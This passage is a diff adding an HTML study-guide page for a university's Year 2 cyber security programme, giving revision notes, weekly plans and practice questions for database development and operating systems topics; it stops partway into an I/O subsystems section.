@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UWS Year 2 Cyber Security — Study Guide</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@2.44.0/tabler-icons.min.css">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#ffffff;--bg2:#f5f5f3;--bg3:#ededeb;--text:#1a1a18;--text2:#5f5e5a;--text3:#888780;--border:rgba(0,0,0,0.12);--border2:rgba(0,0,0,0.22);--radius:8px;--radius-lg:12px;}
+@media(prefers-color-scheme:dark){:root{--bg:#1e1e1c;--bg2:#2a2a28;--bg3:#333331;--text:#f0efe8;--text2:#b4b2a9;--text3:#888780;--border:rgba(255,255,255,0.1);--border2:rgba(255,255,255,0.2);}}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg3);color:var(--text);min-height:100vh;padding:0}
+.top-bar{background:var(--bg);border-bottom:1px solid var(--border);padding:1rem 1.5rem;position:sticky;top:0;z-index:100}
+.top-bar h1{font-size:16px;font-weight:600;color:var(--text);margin-bottom:0.6rem}
+.nav{display:flex;flex-wrap:wrap;gap:6px}
+.nav-btn{font-size:12px;padding:5px 14px;border-radius:999px;border:1px solid var(--border2);background:var(--bg2);color:var(--text2);cursor:pointer;transition:all 0.15s;font-family:inherit}
+.nav-btn:hover{background:var(--bg3)}
+.nav-btn.active{background:var(--text);color:var(--bg);border-color:var(--text);font-weight:500}
+.content{max-width:820px;margin:0 auto;padding:1.5rem}
+.mod-header-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1.25rem 1.5rem;margin-bottom:1rem;display:flex;align-items:flex-start;gap:14px}
+.mod-icon{width:44px;height:44px;border-radius:var(--radius);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.mod-title{font-size:18px;font-weight:600;color:var(--text)}
+.mod-meta{font-size:13px;color:var(--text3);margin-top:3px}
+.mod-desc{font-size:14px;color:var(--text2);margin-top:6px;line-height:1.6}
+.assess-row{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.assess-pill{font-size:12px;padding:4px 10px;border-radius:999px;background:var(--bg2);border:1px solid var(--border);color:var(--text2)}
+.assess-pill strong{color:var(--text)}
+.section-label{font-size:11px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:var(--text3);margin:1.25rem 0 0.6rem}
+.topics-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px}
+.topic-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1rem 1.1rem;cursor:pointer;transition:all 0.15s;display:flex;flex-direction:column;gap:6px}
+.topic-card:hover{border-color:var(--border2);transform:translateY(-1px)}
+.topic-num{font-size:11px;color:var(--text3);font-weight:600}
+.topic-name{font-size:14px;font-weight:600;color:var(--text)}
+.topic-sub{font-size:12px;color:var(--text2);line-height:1.4}
+.topic-arrow{font-size:16px;color:var(--text3);align-self:flex-end;margin-top:4px}
+.back-btn{display:inline-flex;align-items:center;gap:6px;font-size:13px;color:var(--text2);cursor:pointer;border:none;background:none;font-family:inherit;padding:0;margin-bottom:1rem}
+.back-btn:hover{color:var(--text)}
+.back-btn i{font-size:16px}
+.detail-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:1.5rem;margin-bottom:1rem}
+.detail-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:1.25rem;padding-bottom:1.25rem;border-bottom:1px solid var(--border)}
+.breadcrumb{font-size:12px;color:var(--text3);margin-bottom:4px}
+.detail-title{font-size:20px;font-weight:600;color:var(--text)}
+.detail-overview{font-size:14px;color:var(--text2);line-height:1.7;margin-bottom:0.5rem}
+.concepts{display:flex;flex-direction:column;gap:8px}
+.concept{border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
+.concept-head{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;cursor:pointer;background:var(--bg2)}
+.concept-head:hover{background:var(--bg3)}
+.concept-title{font-size:13px;font-weight:600;color:var(--text)}
+.concept-body{padding:12px 14px;border-top:1px solid var(--border);background:var(--bg);font-size:13px;color:var(--text2);line-height:1.7;display:none}
+.concept-body.open{display:block}
+.concept-body ul,.concept-body ol{margin:6px 0 0 1.2rem}
+.concept-body li{margin-bottom:4px}
+.concept-body code{font-family:monospace;background:var(--bg2);padding:1px 5px;border-radius:4px;font-size:12px;color:var(--text)}
+.concept-body pre{font-family:monospace;background:var(--bg2);padding:10px;border-radius:var(--radius);font-size:12px;overflow-x:auto;color:var(--text);margin-top:6px}
+.timeline{display:flex;flex-direction:column;gap:0}
+.tl-item{display:flex;gap:0}
+.tl-left{display:flex;flex-direction:column;align-items:center;width:36px;flex-shrink:0}
+.tl-dot{width:12px;height:12px;border-radius:50%;flex-shrink:0;margin-top:4px}
+.tl-line{width:2px;flex:1;margin:4px 0;background:var(--border2)}
+.tl-item:last-child .tl-line{display:none}
+.tl-body{padding-bottom:1.25rem;flex:1}
+.tl-week{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px}
+.tl-task{font-size:13px;font-weight:600;color:var(--text);margin-bottom:2px}
+.tl-detail{font-size:13px;color:var(--text2);line-height:1.6}
+.tl-hours{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;margin-top:4px;font-weight:500}
+.practice-list{display:flex;flex-direction:column;gap:6px}
+.practice-item{display:flex;gap:10px;align-items:flex-start;padding:10px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);font-size:13px;color:var(--text2);line-height:1.5}
+.practice-item i{font-size:16px;color:var(--text3);flex-shrink:0;margin-top:1px}
+.resource-list{display:flex;flex-direction:column;gap:6px}
+.resource-item{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius)}
+.resource-item i{font-size:16px;color:var(--text3);flex-shrink:0;margin-top:1px}
+.resource-name{font-size:13px;font-weight:500;color:var(--text)}
+.resource-desc{font-size:12px;color:var(--text2);margin-top:2px}
+footer{text-align:center;font-size:12px;color:var(--text3);padding:2rem 1rem}
+</style>
+</head>
+<body>
+<div class="top-bar">
+  <h1>UWS Year 2 Cyber Security — Study Guide</h1>
+  <div class="nav" id="nav"></div>
+</div>
+<div class="content" id="content"></div>
+<footer>Assessment weightings are indicative — always confirm with your module study guide on Moodle.</footer>
+<script>
+const data=[
+{id:"db",name:"Database Development",shortName:"Databases",icon:"ti-database",bg:"#E6F1FB",iconColor:"#185FA5",meta:"Core module · SCQF Level 8",
+desc:"Covers the design, implementation and querying of relational databases. You will learn to model data using ER diagrams, write complex SQL queries, and understand how databases maintain integrity and handle concurrent access.",
+assess:[{l:"Coursework",r:"SQL & design report — 50%"},{l:"Exam",r:"Written theory exam — 50%"}],
+topics:[
+{name:"Relational model",sub:"Tables, keys, relationships, integrity",
+overview:"The relational model organises data into tables with rows and columns. Understanding keys and integrity constraints is essential for all schema design questions.",
+concepts:[
+{title:"Tables, rows and columns",body:"Every attribute must be atomic (one value per cell). The schema defines structure; the instance is the actual data.<ul><li>Each row represents one real-world record</li><li>All values in a column must be of the same domain/type</li></ul>"},
+{title:"Primary and foreign keys",body:"<ul><li><strong>Primary key</strong> — unique, NOT NULL, identifies each row</li><li><strong>Composite key</strong> — two or more columns together</li><li><strong>Candidate key</strong> — any column(s) that could be primary key</li><li><strong>Foreign key</strong> — references primary key of another table</li></ul>"},
+{title:"Referential integrity",body:"FK values must always point to an existing PK row.<ul><li><code>ON DELETE CASCADE</code> — deleting parent deletes children</li><li><code>ON DELETE SET NULL</code> — sets FK to NULL</li><li><code>ON DELETE RESTRICT</code> — prevents deletion if children exist</li></ul>"},
+{title:"Constraints",body:"<ul><li><code>NOT NULL</code> — column must have a value</li><li><code>UNIQUE</code> — no duplicates</li><li><code>CHECK (age >= 18)</code> — value must satisfy condition</li><li><code>DEFAULT value</code> — fallback when none provided</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"4 hrs",task:"Theory and schema design",detail:"Study tables, keys and constraints. Draw a student-course-lecturer schema identifying all key types."},
+{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Key identification practice",detail:"Given schemas, identify all candidate, primary and foreign keys. Spot referential integrity violations."},
+{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Past exam questions",detail:"Write CREATE TABLE statements with full constraints. Explain CASCADE behaviours under exam pressure."}],
+practice:["Draw a library schema (books, members, loans) with all keys","Write CREATE TABLE SQL with PK, FK, NOT NULL and CHECK constraints","Identify all candidate keys in a given staff-department table","Explain ON DELETE CASCADE vs RESTRICT with a concrete scenario"],
+resources:[{name:"W3Schools SQL reference",desc:"Quick reference for SQL syntax including constraints"},{name:"Lucidchart — Database design tutorial",desc:"Free visual guide to relational modelling"},{name:"PostgreSQL docs — constraints",desc:"Authoritative reference for constraint types"}]},
+
+{name:"SQL",sub:"SELECT, JOINs, GROUP BY, subqueries, aggregates",
+overview:"SQL mastery is essential for both exams (written without a computer) and coursework. Build up from basic SELECT to complex multi-table queries.",
+concepts:[
+{title:"SELECT and filtering",body:"<code>SELECT cols FROM table WHERE condition ORDER BY col LIMIT n;</code><ul><li><code>DISTINCT</code> — removes duplicate rows</li><li><code>LIKE '%text%'</code> — % is wildcard, _ matches one character</li><li><code>BETWEEN x AND y</code>, <code>IN (a,b,c)</code>, <code>IS NULL</code></li><li>AND before OR — use parentheses to be safe</li></ul>"},
+{title:"JOIN types",body:"<ul><li><code>INNER JOIN</code> — only matching rows in both tables</li><li><code>LEFT JOIN</code> — all left rows; NULL where no right match</li><li><code>RIGHT JOIN</code> — all right rows; NULL where no left match</li><li><code>FULL OUTER JOIN</code> — all rows; NULLs where no match</li><li><code>SELF JOIN</code> — table joined to itself (employee-manager)</li></ul>"},
+{title:"GROUP BY and aggregation",body:"<ul><li><code>COUNT(*)</code>, <code>SUM(col)</code>, <code>AVG(col)</code>, <code>MIN(col)</code>, <code>MAX(col)</code></li><li><code>GROUP BY col</code> — groups before aggregating</li><li><code>HAVING condition</code> — filters groups (like WHERE but after grouping)</li><li>Order: FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY</li></ul>"},
+{title:"Subqueries and CTEs",body:"<ul><li><code>WHERE id IN (SELECT id FROM ...)</code></li><li>Correlated subquery — references outer query columns</li><li><code>EXISTS</code> — true if subquery returns any rows</li><li>CTE: <code>WITH cte AS (SELECT ...) SELECT * FROM cte</code></li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"5 hrs",task:"SELECT and filtering",detail:"Write 20+ SELECT queries from scratch on SQLZoo. Practice WHERE with multiple conditions."},
+{week:"Week 2",color:"#378ADD",hours:"5 hrs",task:"JOINs and aggregation",detail:"Write queries using all JOIN types. Practice GROUP BY with HAVING. Know when each is appropriate."},
+{week:"Week 3",color:"#85B7EB",hours:"3 hrs",task:"Subqueries and timed practice",detail:"Practice nested and correlated subqueries. Write exam queries by hand, then verify."}],
+practice:["Find students not enrolled in any module using NOT EXISTS","Find average grade per module showing only modules with 10+ students","List top 3 lecturers by module count using a subquery","Write a self-join to find employees sharing the same manager"],
+resources:[{name:"SQLZoo",desc:"Interactive SQL exercises with instant feedback"},{name:"LeetCode SQL problems",desc:"Database problems of increasing difficulty"},{name:"Mode SQL tutorial",desc:"Covers advanced SQL topics"}]},
+
+{name:"Normalisation",sub:"1NF, 2NF, 3NF, BCNF and update anomalies",
+overview:"Normalisation eliminates redundancy and prevents data anomalies. Exam questions ask you to decompose tables and justify each step.",
+concepts:[
+{title:"Why normalise? Update anomalies",body:"Unnormalised tables cause three problems:<ul><li><strong>Insert anomaly</strong> — cannot insert without unrelated data</li><li><strong>Update anomaly</strong> — one fact in many rows needs many updates</li><li><strong>Delete anomaly</strong> — deleting a row removes other useful data</li></ul>"},
+{title:"1NF — First Normal Form",body:"<ul><li>All attributes atomic — no arrays or repeating groups</li><li>Each row unique — a primary key exists</li><li>Fix: move repeating groups to a separate table</li></ul>"},
+{title:"2NF — Second Normal Form",body:"In 1NF plus no partial dependencies:<ul><li>Non-key attributes depend on the <em>whole</em> primary key</li><li>Only applies when primary key is composite</li><li>Example violation: OrderItem(orderID, productID, productName) — productName depends only on productID</li><li>Fix: move productName to a Product table</li></ul>"},
+{title:"3NF and BCNF",body:"<strong>3NF</strong>: In 2NF plus no transitive dependencies.<ul><li>Example: Student(studentID, postcode, city) — city depends on postcode not studentID</li><li>Fix: Postcode(postcode, city) table</li></ul><strong>BCNF</strong>: Every determinant is a candidate key — stricter than 3NF."}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"Anomalies and 1NF",detail:"Study each anomaly type with concrete examples. Spot non-atomic values."},
+{week:"Week 2",color:"#378ADD",hours:"4 hrs",task:"2NF and 3NF decomposition",detail:"Decompose unnormalised tables to 3NF step by step, documenting all functional dependencies."},
+{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"BCNF and past papers",detail:"Practise explaining each decomposition step — exams ask you to justify your decisions."}],
+practice:["Normalise an Order table to 3NF — show every step","Identify all functional dependencies in a given schema","Explain 2NF vs 3NF with your own invented example","Find a 3NF table that is not in BCNF and explain why"],
+resources:[{name:"Studytonight — Normalisation",desc:"Clear worked examples for each normal form"},{name:"Khan Academy — Normalisation",desc:"Free video walkthrough"},{name:"Your lecturer's examples",desc:"Closest to what appears in the exam"}]},
+
+{name:"ER diagrams",sub:"Entities, attributes, cardinality, mapping to SQL",
+overview:"ER diagrams are the primary design tool before writing SQL. Exams give a scenario in prose and ask you to draw the diagram, then map it to a relational schema.",
+concepts:[
+{title:"Entities and attributes",body:"<ul><li><strong>Key attribute</strong> — uniquely identifies entity (underlined)</li><li><strong>Multivalued</strong> — multiple values possible (double ellipse)</li><li><strong>Derived</strong> — computed from another attribute (dashed ellipse)</li><li><strong>Weak entity</strong> — cannot be identified without a parent (double rectangle)</li></ul>"},
+{title:"Relationships and cardinality",body:"<ul><li><strong>1:1</strong> — one person has one passport</li><li><strong>1:N</strong> — one department has many employees</li><li><strong>M:N</strong> — many students enrolled in many modules</li><li><strong>Total participation</strong> (double line) — every entity must participate</li><li><strong>Partial participation</strong> (single line) — may or may not participate</li></ul>"},
+{title:"Mapping ER to SQL tables",body:"<ul><li>Strong entity → one table</li><li>1:N → FK on the many side</li><li>M:N → junction table with FKs to both entities</li><li>1:1 → FK on the total-participation side</li><li>Multivalued attribute → separate table with FK</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"ER notation",detail:"Draw ER diagrams for 3 real-world scenarios (hospital, library, online shop)."},
+{week:"Week 2",color:"#378ADD",hours:"4 hrs",task:"Mapping to SQL",detail:"Convert ER diagrams to CREATE TABLE statements. Focus on M:N junction tables."},
+{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Past exam questions",detail:"Practise drawing an ER diagram from a prose paragraph in under 15 minutes."}],
+practice:["Draw an ER diagram for a hospital (patients, doctors, appointments, wards)","Convert an M:N ER relationship into SQL tables with a junction table","Identify all weak entities in an exam booking system","Explain total vs partial participation with a hospital example"],
+resources:[{name:"draw.io / diagrams.net",desc:"Free browser-based ER diagram tool"},{name:"Lucidchart ER tutorial",desc:"Step-by-step guide with examples"},{name:"Chen vs Crow's Foot notation guide",desc:"Know which notation your module uses"}]},
+
+{name:"Transactions",sub:"ACID properties, commit/rollback, isolation levels",
+overview:"Transactions ensure database operations complete atomically even under concurrent access. ACID and isolation level trade-offs are guaranteed exam topics.",
+concepts:[
+{title:"ACID properties",body:"<ul><li><strong>Atomicity</strong> — all operations succeed or all roll back</li><li><strong>Consistency</strong> — DB moves from one valid state to another</li><li><strong>Isolation</strong> — concurrent transactions don't interfere</li><li><strong>Durability</strong> — committed changes survive system failures</li></ul>Classic example: a bank transfer either completes fully or is cancelled entirely."},
+{title:"Commit and rollback",body:"<ul><li><code>BEGIN TRANSACTION</code> — starts a block</li><li><code>COMMIT</code> — saves changes permanently</li><li><code>ROLLBACK</code> — undoes all changes to last commit</li><li><code>SAVEPOINT name</code> — partial rollback point</li><li>Crash before COMMIT → automatic rollback on restart</li></ul>"},
+{title:"Concurrency problems",body:"<ul><li><strong>Dirty read</strong> — reading uncommitted data from another transaction</li><li><strong>Non-repeatable read</strong> — same row gives different result on re-read</li><li><strong>Phantom read</strong> — re-running query returns different rows</li><li><strong>Lost update</strong> — two transactions overwrite same value; one is lost</li></ul>"},
+{title:"Isolation levels",body:"Weakest to strongest:<ul><li><strong>READ UNCOMMITTED</strong> — dirty reads possible (fastest)</li><li><strong>READ COMMITTED</strong> — only reads committed data</li><li><strong>REPEATABLE READ</strong> — prevents dirty + non-repeatable reads</li><li><strong>SERIALIZABLE</strong> — fully isolated (safest, slowest)</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"ACID and transaction SQL",detail:"Write ACID properties in your own words. Write transaction blocks with COMMIT and ROLLBACK."},
+{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Isolation levels",detail:"Create a table mapping each isolation level to which anomalies it prevents — classic exam question."},
+{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Scenario questions",detail:"For each scenario, identify which ACID property is violated and how to fix it."}],
+practice:["Write a SQL transaction for a bank transfer with ROLLBACK on error","Table: which isolation level prevents each concurrency anomaly?","Which ACID property is violated if the DB crashes mid-transaction?","Describe a scenario where a dirty read causes a serious problem"],
+resources:[{name:"PostgreSQL docs — transactions",desc:"Official reference"},{name:"Use The Index Luke",desc:"Practical transaction explanation"},{name:"Fireship — DB transactions (YouTube)",desc:"8-minute visual explainer"}]},
+
+{name:"Stored procedures",sub:"Procedures, functions, triggers, views",
+overview:"Stored procedures and related objects encapsulate server-side SQL logic for reuse and security. Assessed in both coursework (write one) and exams (explain when to use each).",
+concepts:[
+{title:"Stored procedures",body:"Named SQL block stored on the server:<ul><li>Accepts IN/OUT/INOUT parameters, supports IF/ELSE and loops</li><li>Called with EXEC or CALL</li><li>Benefits: reusable, reduced network traffic, securable independently</li></ul>"},
+{title:"User-defined functions",body:"<ul><li>Scalar — returns one value; usable inside SELECT</li><li>Table-valued — returns a result set; usable in FROM clause</li><li>Cannot modify data (no side effects) in most DBMSs</li></ul>"},
+{title:"Triggers",body:"Fire automatically on INSERT, UPDATE or DELETE:<ul><li>Timing: BEFORE or AFTER the event</li><li>Access to NEW and OLD row values</li><li>Uses: audit logging, enforcing complex business rules</li><li>Warning: hidden logic makes debugging harder</li></ul>"},
+{title:"Views",body:"Saved SELECT acting as a virtual table:<ul><li>No data stored — re-executes on each access</li><li>Benefits: simplify complex queries, hide columns for security</li><li>Materialised view — stores results physically for performance</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#185FA5",hours:"3 hrs",task:"Views and procedures",detail:"Write views for complex queries. Create stored procedures accepting parameters."},
+{week:"Week 2",color:"#378ADD",hours:"3 hrs",task:"Triggers and functions",detail:"Write BEFORE/AFTER triggers for audit logging. Create scalar functions used in SELECT."},
+{week:"Week 3",color:"#85B7EB",hours:"2 hrs",task:"Exam practice",detail:"Write a procedure or trigger under timed conditions. Explain trigger vs constraint."}],
+practice:["Create a view showing students with total credits completed","Write a stored procedure to enrol a student with validation logic","Create an AFTER INSERT trigger logging changes to an audit table","Explain the difference between a stored procedure and a function"],
+resources:[{name:"PostgreSQL CREATE PROCEDURE docs",desc:"Full syntax with examples"},{name:"MySQL trigger documentation",desc:"Complete trigger reference"},{name:"Microsoft Learn — Stored Procedures",desc:"Comprehensive free tutorial"}]}
+]},
+
+{id:"os",name:"Operating Systems",shortName:"OS",icon:"ti-cpu",bg:"#EAF3DE",iconColor:"#3B6D11",meta:"Core module · SCQF Level 8",
+desc:"Examines how operating systems manage CPU, memory, storage and I/O. Scheduling algorithm calculations and page replacement traces are guaranteed exam content.",
+assess:[{l:"Coursework",r:"Lab reports / portfolio — 50%"},{l:"Exam",r:"Theory exam — 50%"}],
+topics:[
+{name:"Process management",sub:"Scheduling algorithms, process states, PCB, Gantt chart calculations",
+overview:"The OS manages multiple processes sharing one CPU. Scheduling algorithm Gantt chart calculations appear in almost every exam — practise until you are fast and accurate.",
+concepts:[
+{title:"Five process states",body:"<ul><li><strong>New</strong> → <strong>Ready</strong> (admitted to ready queue)</li><li><strong>Ready</strong> → <strong>Running</strong> (CPU scheduler selects it)</li><li><strong>Running</strong> → <strong>Ready</strong> (preempted by scheduler)</li><li><strong>Running</strong> → <strong>Waiting</strong> (I/O or event requested)</li><li><strong>Waiting</strong> → <strong>Ready</strong> (I/O complete)</li><li><strong>Running</strong> → <strong>Terminated</strong> (process exits)</li></ul>"},
+{title:"Process Control Block (PCB)",body:"Data structure holding all process info:<ul><li>PID, PPID, process state</li><li>Program counter — address of next instruction</li><li>CPU registers — saved during context switch</li><li>Memory management info — page table pointer</li><li>Open file descriptors, accounting info (CPU time, priority)</li></ul>"},
+{title:"Scheduling algorithms",body:"<strong>Non-preemptive:</strong><ul><li><strong>FCFS</strong> — First Come First Served. Simple; convoy effect</li><li><strong>SJF</strong> — Shortest Job First. Optimal average wait; needs burst time knowledge</li></ul><strong>Preemptive:</strong><ul><li><strong>SRTF</strong> — Preemptive SJF</li><li><strong>Round Robin</strong> — time quantum; fair but context switch overhead</li><li><strong>Priority</strong> — starvation risk; fix with ageing</li></ul>"},
+{title:"How to calculate metrics",body:"Draw the Gantt chart first, then calculate:<ul><li><strong>Turnaround time</strong> = Completion − Arrival</li><li><strong>Waiting time</strong> = Turnaround − Burst</li><li><strong>Response time</strong> = First CPU allocation − Arrival</li><li>Average = sum / number of processes</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"States and PCB",detail:"Memorise the 5-state diagram with all transitions. List every PCB field and explain its role."},
+{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Scheduling calculations",detail:"Work Gantt chart calculations for all 5 algorithms with at least 5 different process sets."},
+{week:"Week 3",color:"#97C459",hours:"3 hrs",task:"Timed exam practice",detail:"Scheduling calculations are guaranteed exam content — time yourself to build speed."}],
+practice:["P1(0,8) P2(1,4) P3(2,9) P4(3,5) — Gantt charts for FCFS, SJF, Round Robin (q=2)","Calculate average waiting and turnaround time for each algorithm above","Draw the 5-state process diagram with all transitions and trigger conditions labelled","Explain every piece of data saved in a PCB during a context switch and why each is needed"],
+resources:[{name:"Neso Academy — OS scheduling playlist",desc:"Worked examples with Gantt charts"},{name:"OS Concepts — Silberschatz Ch.3-5",desc:"The standard textbook"},{name:"os-scheduling.netlify.app",desc:"Interactive Gantt chart generator to check answers"}]},
+
+{name:"Memory management",sub:"Paging, virtual memory, page replacement algorithms",
+overview:"Paging and virtual memory allow processes to share RAM safely. Page replacement algorithm traces (FIFO, LRU, OPT) are a classic exam calculation question.",
+concepts:[
+{title:"Logical vs physical addressing",body:"<ul><li><strong>Logical address</strong> — generated by CPU (what the process sees)</li><li><strong>Physical address</strong> — actual RAM location</li><li>The MMU translates logical → physical at runtime</li><li>Enables processes to be relocated without their knowledge</li></ul>"},
+{title:"Paging mechanics",body:"<ul><li><strong>Frame</strong> — fixed-size block of physical memory (typically 4KB)</li><li><strong>Page</strong> — fixed-size block of logical address space</li><li><strong>Page table</strong> — maps page numbers to frame numbers (one per process)</li><li>Logical address = (page number, offset). MMU looks up frame, adds offset</li><li><strong>TLB</strong> — fast cache for recent page table lookups</li></ul>"},
+{title:"Virtual memory and demand paging",body:"<ul><li>Pages loaded only when accessed (demand paging)</li><li><strong>Page fault</strong> — page not in RAM; OS loads from disk</li><li><strong>Thrashing</strong> — too many faults; system only swaps, no useful work</li><li><strong>Working set</strong> — actively used pages; keep in RAM to prevent thrashing</li></ul>"},
+{title:"Page replacement algorithms",body:"When RAM full and fault occurs, evict a page:<ul><li><strong>FIFO</strong> — evict oldest. Can suffer Belady's anomaly</li><li><strong>LRU</strong> — evict least recently used. Good approximation of optimal</li><li><strong>Optimal</strong> — evict page used furthest in future. Best but needs future knowledge</li><li>Trace reference strings and count faults — exam staple</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Paging and address translation",detail:"Draw the translation process. Practice calculating physical addresses from page tables."},
+{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Page replacement traces",detail:"Trace reference strings with FIFO, LRU and OPT. Count page faults per algorithm."},
+{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"Virtual memory theory",detail:"Understand thrashing and working set model for theory exam questions."}],
+practice:["Given page table and logical address, calculate physical address","Trace 1,2,3,4,1,2,5,1,2,3,4,5 with 3 frames — FIFO and LRU fault counts","Explain why thrashing occurs and two ways to prevent it","Calculate effective memory access time: TLB hit ratio 90%, TLB access 5ns, memory 100ns"],
+resources:[{name:"Neso Academy — Memory Management",desc:"Visual walkthroughs of paging and page replacement"},{name:"OS Concepts Ch.8-10 — Silberschatz",desc:"Standard textbook coverage"},{name:"Online page replacement simulator",desc:"Search for interactive tools to verify your traces"}]},
+
+{name:"File systems",sub:"FAT, NTFS, ext4, inodes, allocation methods, journaling",
+overview:"File systems manage data storage and retrieval. Inode structure, allocation methods and file system comparison are commonly examined as theory questions.",
+concepts:[
+{title:"Disk allocation methods",body:"<ul><li><strong>Contiguous</strong> — all blocks together. Fast sequential reads; fragmentation problem</li><li><strong>Linked</strong> — each block points to next. Easy to grow; slow random access</li><li><strong>Indexed (inode)</strong> — index block holds all data block pointers. Best balance</li></ul>"},
+{title:"Inodes (Linux/ext4)",body:"Stores all file metadata except filename:<ul><li>Permissions, owner, group, size, timestamps</li><li>Block pointers: 12 direct + single + double + triple indirect</li><li><code>stat file</code> — full inode info; <code>ls -i</code> — inode number</li><li>Hard link — another directory entry to same inode</li><li>Soft link — contains path string; breaks if target moved</li></ul>"},
+{title:"File systems compared",body:"<ul><li><strong>FAT32</strong> — max 4GB file, no permissions, no journaling, widely compatible</li><li><strong>NTFS</strong> — large files, ACL permissions, journaling (Windows)</li><li><strong>ext4</strong> — large files/volumes, journaling, extents (Linux standard)</li></ul>"},
+{title:"Journaling",body:"Prevents corruption after a crash:<ul><li>Changes logged to journal before being applied to disk</li><li>On crash: replay journal to complete or undo incomplete operations</li><li>Without it: full fsck scan needed on recovery (very slow)</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Allocation methods",detail:"Draw contiguous, linked and indexed allocation across multiple disk blocks."},
+{week:"Week 2",color:"#639922",hours:"3 hrs",task:"Inodes",detail:"Use stat and ls -i on your Linux VM. Calculate max file size from inode pointer structure."},
+{week:"Week 3",color:"#97C459",hours:"2 hrs",task:"File system comparison",detail:"Build a comparison table of FAT32/NTFS/ext4. Explain journaling."}],
+practice:["Explain how the OS locates data block 8 of a file via inode direct pointers","Calculate max file size: 12 direct + 1 single indirect (4KB blocks, 4-byte pointers)","Compare FAT32 and NTFS — when would you choose each?","What is journaling and how does it speed up recovery after a crash?"],
+resources:[{name:"Linux man ext4",desc:"Technical reference"},{name:"IBM Developer — Linux file system",desc:"Clear inode explanation"},{name:"OS Concepts Ch.13-14 — Silberschatz",desc:"File system chapters"}]},
+
+{name:"Concurrency",sub:"Threads, race conditions, semaphores, deadlock, Banker's algorithm",
+overview:"Concurrency enables parallelism but requires synchronisation. The 4 Coffman conditions and Banker's algorithm are heavily assessed — expect both theory and calculation questions.",
+concepts:[
+{title:"Threads vs processes",body:"<ul><li><strong>Process</strong> — independent program with own memory space</li><li><strong>Thread</strong> — lightweight unit within a process, sharing memory</li><li>Threads cheaper to create and switch; shared memory enables race conditions</li></ul>"},
+{title:"Race conditions and synchronisation",body:"<ul><li><strong>Race condition</strong> — result depends on thread execution order</li><li><strong>Critical section</strong> — shared data access; one thread at a time</li><li>Solutions: Mutex (binary lock), Semaphore (integer with wait/signal), Monitor (language construct)</li><li>Must satisfy: mutual exclusion, progress, bounded waiting</li></ul>"},
+{title:"Deadlock — 4 Coffman conditions",body:"ALL must hold for deadlock:<ul><li><strong>Mutual exclusion</strong> — resource held by one thread only</li><li><strong>Hold and wait</strong> — holds a resource while waiting for another</li><li><strong>No preemption</strong> — resource cannot be forcibly taken</li><li><strong>Circular wait</strong> — T1 waits for T2, T2 waits for T1</li></ul>Break any one condition to prevent deadlock."},
+{title:"Banker's algorithm",body:"Determines if granting a request leaves a safe state:<ul><li><strong>Safe state</strong> — a sequence exists where all threads can complete</li><li>Need matrix = Max − Allocation</li><li>Simulate allocation; if safe sequence still exists, grant request</li></ul>"}],
+timeline:[
+{week:"Week 1",color:"#3B6D11",hours:"3 hrs",task:"Threads and synchronisation",detail:"Write a pseudocode race condition. Study semaphore wait/signal. Solve producer-consumer."},
+{week:"Week 2",color:"#639922",hours:"4 hrs",task:"Coffman conditions and deadlock",detail:"Memorise 4 conditions. Identify deadlock in resource allocation graphs."},
+{week:"Week 3",color:"#97C459",hours:"3 hrs",task:"Banker's algorithm",detail:"Work Banker's algorithm examples until the process is automatic."}],
+practice:["Show a race condition with 2 threads incrementing a shared counter","Solve producer-consumer problem using semaphores","Given resource allocation graph, determine if deadlock exists","Run Banker's algorithm: 3 processes, 3 resource types — find safe sequence"],
+resources:[{name:"Neso Academy — Deadlock playlist",desc:"Step-by-step Banker's algorithm examples"},{name:"OS Concepts Ch.6-8 — Silberschatz",desc:"Synchronisation and deadlock chapters"},{name:"Little Book of Semaphores — Downey (free PDF)",desc:"Practical concurrency problems"}]},
+
+{name:"I/O subsystems",sub:"Interrupts, DMA, kernel I/O layers, buffering",
